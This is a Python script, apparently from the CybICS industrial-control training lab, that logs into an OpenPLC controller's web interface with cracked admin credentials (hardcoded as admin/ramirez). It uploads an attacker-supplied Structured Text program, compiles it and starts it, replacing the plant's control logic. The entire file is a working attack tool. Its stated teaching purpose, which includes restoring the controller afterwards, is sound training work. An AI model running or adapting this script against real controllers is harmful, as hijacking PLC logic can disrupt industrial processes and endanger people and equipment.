#!/usr/bin/env python3
"""Upload, compile and run a PLC program on OpenPLC via its web API.

The attacker view for the plc_programming lesson: with the cracked OpenPLC
admin login, push an attacker-controlled ST program onto the controller so it
runs foreign logic in place of the plant's. Also used (with the seeded plant
program) to restore the controller afterwards.

Usage: plc_upload.py <st_file> [name] [user] [pass]
"""
import re
import sys
import time

import requests

BASE = "http://172.18.0.3:8080"
st_file = sys.argv[1] if len(sys.argv) > 1 else "/CybICS/doc/video-series/attacker_program.st"
name = sys.argv[2] if len(sys.argv) > 2 else "AttackerLogic"
user = sys.argv[3] if len(sys.argv) > 3 else "admin"
pw = sys.argv[4] if len(sys.argv) > 4 else "ramirez"

s = requests.Session()
s.post(f"{BASE}/login", data={"username": user, "password": pw}, timeout=10)
print(f"[+] logged in to OpenPLC as {user}")

r = s.post(f"{BASE}/upload-program", files={"file": open(st_file, "rb")}, timeout=20)
fn = re.search(r"([0-9]+\.st)", r.text).group(1)
print(f"[+] uploaded {st_file}  ->  program file {fn}")

s.post(f"{BASE}/upload-program-action",
       data={"prog_name": name, "prog_descr": "loaded by attacker",
             "prog_file": fn, "epoch_time": str(int(time.time()))}, timeout=10)
s.get(f"{BASE}/compile-program?file={fn}", timeout=20)
print("[+] compiling the program on the controller ...")
time.sleep(6)
logs = s.get(f"{BASE}/compilation-logs", timeout=10).text.strip().splitlines()
for line in logs[-2:]:
    print("    " + line)
s.get(f"{BASE}/start_plc", timeout=10)
print(f"[+] started - the controller now runs program {fn}")
